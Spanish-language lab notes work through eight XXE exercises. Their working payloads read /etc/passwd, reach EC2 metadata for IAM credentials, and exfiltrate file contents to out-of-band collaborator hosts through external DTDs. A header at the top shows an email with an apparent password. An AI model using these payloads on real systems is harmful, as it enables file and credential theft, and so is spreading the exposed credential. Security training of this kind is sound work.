[[RED TEAM]]
eduardo.lazaro@heuristica-ti.com.mx
2|653C[8Wr=J-rN"ygd,$495$Hg&k94}

---
# Lab 1 : Exploiting XXE external entities to retrieve files

En esencia, XML External Entity (Entidad Externa XML) es una característica legítima en XML que permite a un documento XML hacer referencia a entidades definidas en un lugar externo, como archivos, bases de datos o incluso recursos de red. Sin embargo, si esta característica no se maneja correctamente, puede dar lugar a ataques de inyección de entidades externas que permiten a un atacante acceder a archivos en el servidor.

El ataque XXE que se menciona específicamente en tu pregunta implica manipular una entrada XML en una aplicación web para que haga referencia a un archivo en el sistema de archivos del servidor y luego se aproveche para leer su contenido. Por ejemplo, un atacante podría crear un archivo XML malicioso que contiene una referencia a un archivo sensible en el servidor, y luego enviar este archivo XML a la aplicación web. Si la aplicación no valida adecuadamente las entidades externas y procesa el archivo XML de manera insegura, el atacante podría recuperar el contenido del archivo deseado y potencialmente obtener información confidencial.

==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. Para resolver el laboratorio, inyecte una entidad externa XML para recuperar el contenido del archivo /etc/passwd.==

![[Pasted image 20230814115018.png|]]

```java
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
2
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
==El fragmento de código XML es un ejemplo de un documento XML. XML (Extensible Markup Language) es un lenguaje de marcado utilizado para estructurar y almacenar datos en un formato legible tanto para humanos como para máquinas.un fragmento de datos relacionados con la verificación de stock de un producto en una tienda.

![[Pasted image 20230814121015.png|1000]]

```java 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
---
# Lab 2 : Exploiting XXE to perform SSRF attacks

1. **XXE (XML External Entity)**: Como se mencionó anteriormente, XXE es una vulnerabilidad que permite a un atacante insertar referencias a entidades externas en un documento XML que una aplicación procesa. Esto puede llevar a la exposición de archivos en el servidor o incluso a la realización de ataques más avanzados.
    
2. **SSRF (Server-Side Request Forgery)**: SSRF es una vulnerabilidad en la que un atacante engaña a una aplicación para que realice solicitudes a recursos en red, como servidores internos o externos, en nombre del servidor donde se encuentra la aplicación. Esto puede permitir al atacante acceder a recursos a los que normalmente no tendría acceso o realizar ataques a otros sistemas internos.

==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta. 
El servidor de laboratorio ejecuta un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. 
Este punto final se puede usar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales. 
Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta de IAM del servidor desde el extremo de metadatos de EC2.==

![[Pasted image 20230814124020.png|1000]]

```java
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>
1
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
![[Pasted image 20230814124522.png|1000]]

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
![[Pasted image 20230814125036.png]]

![[Pasted image 20230814125142.png]]

```java
http://169.254.169254/latest/meta-data/iam/security-credentials/admin
```
---

# Lab 3 : Blind XXE with out-of-band interaction via XML parameter entities

1. **Blind XXE (XXE Ciego)**: En un ataque de XXE ciego, el atacante inyecta entidades externas maliciosas en una aplicación web que procesa XML. Sin embargo, a diferencia de los ataques XXE tradicionales, en los cuales el atacante puede ver la respuesta del servidor en tiempo real, en un ataque ciego, el atacante no recibe una respuesta inmediata con la información explotada.
    
2. **Out-of-band Interaction (Interacción fuera de banda)**: En lugar de esperar una respuesta directa del servidor, el atacante configura el sistema para que realice interacciones con el servidor a través de canales de comunicación alternativos, como solicitudes HTTP, peticiones DNS o incluso servicios de terceros. Estos canales secundarios se utilizan para extraer la información que el atacante intenta obtener.
    
3. **XML Parameter Entities (Entidades de parámetros XML)**: Las entidades de parámetros son características de XML que permiten definir fragmentos de contenido para su reutilización dentro del mismo documento XML. En el contexto de un ataque XXE ciego, las entidades de parámetros se utilizan para generar solicitudes a través de canales fuera de banda. Esto permite al atacante recibir información indirectamente a través de estos canales, evitando la necesidad de una respuesta directa del servidor explotado.

==Este laboratorio tiene una característica de "Comprobar existencias" que analiza la entrada XML, pero no muestra ningún valor inesperado y bloquea las solicitudes que contienen entidades externas regulares. Para resolver el laboratorio, use una entidad de parámetro para hacer que el analizador XML emita una búsqueda de DNS y una solicitud HTTP a Burp Collaborator.==

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://iseyaezmbw57zv1uxms07rn10s6juei3.oastify.com/TESTXXE">]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

![[Pasted image 20230815164453.png]]

![[Pasted image 20230815164943.png]]
La idea básica detrás de Burp Collaborator es que crea un punto de comunicación controlado por el atacante (a menudo un subdominio o un dominio que está bajo el control de PortSwigger) que se utiliza para rastrear las interacciones entre la aplicación objetivo y el servidor Collaborator. Aquí hay algunos escenarios donde el Collaborator puede ser útil
![[Pasted image 20230815164959.png]]

---
# Lab 4 : Blind XXE with out-of-band interaction via XML parameter entities

La inyección de entidad externa XML (XXE) es una vulnerabilidad que se produce cuando una aplicación web procesa entradas XML no confiables sin la debida validación o mitigación. Un atacante puede aprovechar esta vulnerabilidad para cargar entidades XML externas, lo que podría resultar en la revelación de información confidencial del servidor, ataques de denegación de servicio o incluso la ejecución de código remoto.

En el contexto de "Blind XXE", el ataque es denominado "ciego" porque el atacante no recibe directamente la respuesta del servidor, lo que significa que no puede ver directamente la salida del ataque. En lugar de eso, el atacante explora la posibilidad de interacciones fuera de banda. Esto significa que el atacante induce al servidor a comunicarse con recursos controlados por el atacante, como un servidor web o un servicio de red, para obtener información sobre el éxito o el resultado del ataque.

La técnica de "out-of-band interaction via XML parameter entities" se refiere a la forma en que el atacante logra la interacción fuera de banda utilizando entidades de parámetros XML. Las entidades de parámetros XML son constructos en XML que permiten definir y utilizar variables para representar datos. Los atacantes pueden aprovechar estas entidades de parámetros para provocar solicitudes de red desde el servidor vulnerable hacia recursos controlados por el atacante, como servidores web, sistemas DNS o servidores FTP. Luego, el atacante puede monitorear estas interacciones fuera de banda para obtener información sobre el éxito del ataque.

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://1eghwxl5xfrqlendj5ejta9kmbs2gy4n.oastify.com/testing"> %xxe; ]>
<stockCheck>
<productId>
2
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

![[Pasted image 20230815173326.png]]

![[Pasted image 20230815173958.png]]

![[Pasted image 20230815174105.png]]

---

# Lab 5 : Exploiting blind XXE to exfiltrate data using a malicious external DTD

Exploiting blind XXE to exfiltrate data using a malicious external DTD" se refiere a una técnica de ataque que aprovecha una vulnerabilidad de "XML External Entity Injection" (XXE) ciega para extraer datos confidenciales utilizando una DTD (Documento de Tipo de Documento) externa maliciosa.

Para entender esto mejor, desglosemos los elementos clave:

1. **XML External Entity Injection (XXE)**: Es una vulnerabilidad que ocurre cuando una aplicación procesa entradas XML no confiables sin la debida validación o mitigación. Permite que un atacante cargue entidades XML externas, lo que puede resultar en la exposición de información confidencial, ataques de denegación de servicio o incluso la ejecución remota de código.
    
2. **Blind XXE**: En este caso, se refiere a la situación en la que el atacante no recibe respuestas directas del servidor sobre los resultados de la inyección. En lugar de eso, el atacante intenta inferir el éxito del ataque observando interacciones "fuera de banda", es decir, interacciones del servidor con recursos controlados por el atacante, como solicitudes de red.
    
3. **Exfiltración de datos**: Se refiere al acto de robar o extraer datos confidenciales o valiosos desde un sistema o aplicación.
    
4. **Malicious external DTD**: Una DTD externa es una referencia a una definición de tipo de documento que se encuentra fuera del propio documento XML. Un atacante puede utilizar una DTD maliciosa para definir entidades que hacen referencia a recursos controlados por el atacante, como direcciones de IP o URLs. Esto permite al atacante llevar a cabo ataques de XXE ciegos y potencialmente extraer información sensible.

```java
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://go8zndrgbyrm21o0bv6jkht9b0hr5it7.oastify.com/?content=%file;'>">
%eval;
%exfil;
```
```java
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ad500900314163a8220f54c012f00e8.exploit-server.net/exploit"> %xxe; ]>
```

![[Pasted image 20230817111331.png]]

![[Pasted image 20230817113813.png]]

![[Pasted image 20230817113843.png]]

![[Pasted image 20230817113858.png]]

---

# Lab 6 : Exploiting blind XXE to retrieve data via error messages

Se refiere a una técnica de explotación de la vulnerabilidad de XXE (XML External Entity) en la que un atacante intenta extraer información sensible de un sistema objetivo a través de mensajes de error generados por el servidor, incluso cuando no recibe una respuesta directa del servidor.

Este laboratorio tiene una función llamada "Verificar stock" que analiza una entrada XML pero no muestra el resultado.,Para resolver el laboratorio, utiliza un DTD externo para provocar un mensaje de error que muestre el contenido del archivo /etc/passwd.
El laboratorio contiene un enlace a un servidor de explotación en un dominio diferente donde puedes alojar tu DTD malicioso.

![[Pasted image 20230817134112.png]]
![[Pasted image 20230817134141.png]]

```java
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///meloinvento/%file;'>">
%eval;
%exfil;
```

```java
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ab800560426ea4284fea4d4011200c2.exploit-server.net/exploit"> %xxe; ]>
<stockCheck>
<productId>
2
</productId>
<storeId>
1
</storeId>
</stockCheck>
```
---

# Lab 7 : Exploiting XInclude to retrieve files

"Exploiting XInclude to retrieve files" se refiere a una técnica de explotación que aprovecha la funcionalidad de inclusión XML (XInclude) para obtener acceso a archivos en un sistema. XInclude es una característica que permite a los documentos XML incluir contenido de otros documentos XML. Los atacantes pueden abusar de esta funcionalidad para acceder a archivos sensibles o confidenciales en un sistema objetivo.

- **XInclude**: XInclude es una técnica utilizada en XML para combinar contenido de varios documentos XML en uno solo. Permite la inclusión de fragmentos de XML desde otros documentos utilizando la etiqueta `<xi:include>`.
    
- **Exploiting XInclude**: Los atacantes pueden abusar de XInclude para acceder a archivos en el sistema. Pueden manipular la entrada XML para incluir referencias a archivos locales o remotos y forzar al servidor a procesar esos archivos durante el análisis del XML.
    
- **Retrieve Files**: La explotación de XInclude para recuperar archivos implica que el atacante inserta una referencia a un archivo específico que desea acceder, como archivos de configuración, datos confidenciales o cualquier otro archivo en el sistema objetivo.
![[Pasted image 20230817140650.png]]
```java
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

![[Pasted image 20230817140400.png]]

---

# Lab 8 : Exploiting XXE via image file upload


"Exploiting XXE via image file upload" se refiere a una técnica de explotación de la vulnerabilidad de XXE (XML External Entity) que se realiza mediante la carga de archivos de imagen. Esta técnica implica aprovechar una vulnerabilidad en la capacidad de una aplicación para analizar archivos de imagen, como JPEG o PNG, y utilizarla para llevar a cabo un ataque XXE.

Aquí hay una descripción más detallada de cómo funciona esta técnica:

1. **XXE Vulnerability**: XXE es una vulnerabilidad en la que un atacante puede manipular entradas XML para incluir referencias a entidades externas. Estas entidades pueden ser utilizadas para acceder a recursos externos, como archivos en el servidor.
    
2. **Image File Upload**: Algunas aplicaciones permiten a los usuarios cargar archivos de imagen, como avatares o imágenes de perfil. Estos archivos de imagen suelen ser procesados por la aplicación.
    
3. **Exploiting XXE**: El atacante carga un archivo de imagen que contiene código malicioso disfrazado como metadatos XML en el archivo. Cuando la aplicación procesa el archivo de imagen, puede interpretar el contenido XML malicioso y llevar a cabo una explotación XXE.
    
4. **Impacto**: Dependiendo de cómo se configure la explotación, el atacante podría intentar acceder a archivos en el servidor, obtener información confidencial o realizar otras acciones maliciosas.

![[Pasted image 20230817140948.png]]

![[Pasted image 20230817141646.png]]

![[Pasted image 20230817141657.png]]

![[Pasted image 20230817141811.png]]

